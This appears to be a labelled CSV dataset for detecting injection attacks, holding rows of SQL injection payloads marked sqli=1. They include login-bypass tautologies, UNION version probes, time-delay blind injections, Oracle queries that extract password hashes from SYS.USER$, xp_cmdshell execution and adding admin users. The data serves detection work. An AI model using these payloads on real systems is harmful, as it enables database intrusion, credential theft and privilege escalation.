index,payload,sqli,xss
380," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,0
381," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,0
382," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,0
383,&',1,0
384,a' or 3  =  3--,1,0
385," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,0
386," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
387,"admin""or 1  =  1 or """"  =  """,1,0
388,uni/**/on sel/**/ect,1,0
389,""" or """"&""",1,0
390," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,0
391,1 waitfor delay '0:0:10'--,1,0
392,bfilename,1,0
393,admin'  )   or   (  '1'  =  '1'--,1,0
394,UEf,1,0
395, -- &password  = ,1,0
396,1 or sleep  (  __TIME__  )  #,1,0
397," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,0
398," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,0
399," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,0
400,or sleep  (  __TIME__  )  #,1,0
401," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,0
402," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,0
403,||6,1,0
404,or 1/*,1,0
405," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,0
406,select * from users where id  =  1.%@ or 1  =  1 -- 1,1,0
407," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,0
408," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,0
409," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,0
410," or 1  =  1 or """"  =  ",1,0
411," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,0
412,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,0
413," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,0
414,or 'whatever' in   (  'whatever'  ) ,1,0
415,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,0
416,select * from users where id  =  '1'   or 1  =  1 -- 1',1,0
417,?,1,0
418, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,0
419," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,0
420,"admin""  )   or   (  ""1""  =  ""1""#",1,0
421," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,0
422," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,0
423, or '' ',1,0
424," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,0
425,or 1  =  1,1,0
426," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,0
427,""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
428,""" or ""x""  =  ""x",1,0
429,select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,0
430," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,0
431, or 'something' like 'some%',1,0
432," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,0
433,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,0
434,admin' or '1'  =  '1'--,1,0
435," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,0
436," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,0
437," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,0
438,""";waitfor delay '0:0:__TIME__'--",1,0
439,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,0
440," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,0
441," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,0
442,’ or ‘1’  =  ’1,1,0
443," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,0
444,admin'or 1  =  1 or ''  =  ',1,0
445," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,0
446," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,0
447,exec  (  @s  ) ,1,0
448," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,0
449," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,0
450, or 1  =  1,1,0
451,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,0
452," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,0
453," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1,0
454, --,1,0
455," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,0
456," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
457," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
458,update,1,0
459, or 1/*,1,0
460," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1,0
461,"""   )    )    or pg_sleep  (  __TIME__  )  --",1,0
462,||'6,1,0
463," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1,0
464,or   (  EXISTS  ) ,1,0
465,^',1,0
466,or 'text'   =   n'text',1,0
467," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1,0
468," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,0
469," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1,0
470," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1,0
471, or 0  =  0 --,1,0
472," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,0
473," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1,0
474," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1,0
475," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1,0
476,password:*/  =  1--,1,0
477," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1,0
478," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1,0
479," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1,0
480," union   (  select NULL,   (  select @@version   )    )    --",1,0
481," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1,0
482," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,0
483," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1,0
484," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,0
485," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1,0
486," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1,0
487," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1,0
488," select * from users where id  =  1. union select null,version  (    )   -- 1",1,0
489," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1,0
490," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1,0
491, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1,0
492,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1,0
493," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,0
494," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1,0
495," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1,0
496," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1,0
497," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",1,0
498,UNION SELECT,1,0
499,asc,1,0
500," || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1,0
501,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,0
502," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1,0
503,  )   or true--,1,0
504," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,0
505," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,0
506, or userid like '%,1,0
507," union   (  select NULL, NULL,   (  select @@version   )    )    --",1,0
508,/,1,0
509,select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1,0
510,"admin""/*",1,0
511," select * from users where id  =  1.  union select 1,version  (    )   -- 1",1,0
512," select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1,0
513," select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1,0
514,"admin"" or ""1""  =  ""1",1,0
515, union   (  select @@version  )   --,1,0
516, or ''^',1,0
517,"""   )    )    or sleep  (  __TIME__  )    =  """,1,0
518," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1,0
519," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",1,0
520," select * from users where id  =  1 union select @ _,version  (    )   -- 1",1,0
521,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,1,0
522,select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1,0
523," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",1,0
524," select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1,0
525,"""hi""""  )   or   (  """"a""""  =  """"a""",1,0
526,select name from syscolumns where id   =     (  sele ...,1,0
527," select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1,0
528,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",1,0
529," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1,0
530, or 2 between 1 and 3,1,0
531,union all select @@version--,1,0
532," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,0
533,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,0
534,""" or isNULL  (  1/0  )   /*",1,0
535," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1,0
536," select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1,0
537," select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1,0
538,declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1,0
539, or 'a'  =  'a,1,0
540, union all select @@version--,1,0
541," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1,0
542,"admin"" or 1  =  1/*",1,0
543, or   (  EXISTS  ) ,1,0
544," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1,0
545,declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1,0
546," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1,0
547," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1,0
548," select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1,0
549," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1,0
550," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1,0
551,hi' or 1  =  1 --,1,0
552, UNION SELECT,1,0
553,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1,0
554," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1,0
555," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1,0
556," select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1,0
557,desc,1,0
558," select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1,0
559,anything' or 'x'  =  'x,1,0
560," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1,0
561,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,1,0
562,0x770061006900740066006F0072002000640065006C00 ...,1,0
563," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",1,0
564," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",1,0
565," select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",1,0
566," select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",1,0
567,or isNULL  (  1/0  )   /*,1,0
568,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",1,0
569," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1,0
570," select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1,0
571,"admin"" or ""1""  =  ""1""#",1,0
572,"admin"" or 1  =  1--",1,0
573, or user like '%,1,0
574,admin'  )   or '1'  =  '1,1,0
575,""" or sleep  (  __TIME__  )  #",1,0
576," select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",1,0
577," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1,0
578,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',1,0
579, or ''-',1,0
580," select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",1,0
581,admin'  )   or '1'  =  '1'/*,1,0
582," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,0
583," select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",1,0
584,select * from users where id  =  1 <@$ or 1  =  1 -- 1,1,0
585,x' or 1  =  1 or 'x'  =  'y,1,0
586," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,0
587," select * from users where id  =  1 union select 1 $,version  (    )   -- 1",1,0
588,  )   or   (  'x'  )    =    (  'x,1,0
589, ( ,1,0
590," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",1,0
591," select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1,0
592," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",1,0
593," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1,0
594," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",1,0
595," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1,0
596," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1,0
597, )    )    or sleep  (  __TIME__  )    =  ',1,0
598,having 1  =  1--,1,0
599,!,1,0
600,select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,1,0
601, group by userid having 1  =  1--,1,0
602," select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",1,0
603," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1,0
604,or 0  =  0 --,1,0
605, or 0  =  0 #,1,0
606,or pg_sleep  (  __TIME__  )  --,1,0
607,or '1'  =  '1'--,1,0
608," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1,0
609," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1,0
610," select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",1,0
611, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,1,0
